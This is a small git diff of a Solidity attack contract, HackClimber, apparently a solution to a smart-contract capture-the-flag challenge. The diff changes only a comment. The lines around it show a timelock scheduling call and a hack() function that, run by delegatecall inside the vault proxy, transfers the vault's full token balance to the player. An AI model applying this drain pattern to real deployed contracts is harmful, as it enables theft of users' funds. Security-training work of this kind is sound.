@@ -42,7 +42,7 @@ contract HackClimber is UUPSUpgradeable {
         timelock.schedule(targets, values, dataElements, salt);
     }
 
-    // Because this function is call throught delegate call from the "proxy" (ClimberVault)
+    // Because this function is call throught delegate call from the "proxy"
     // We're tranfering the tokens from the vault to us
     function hack(address token, address player) public {
         IERC20(token).transfer(player, IERC20(token).balanceOf(address(this)));
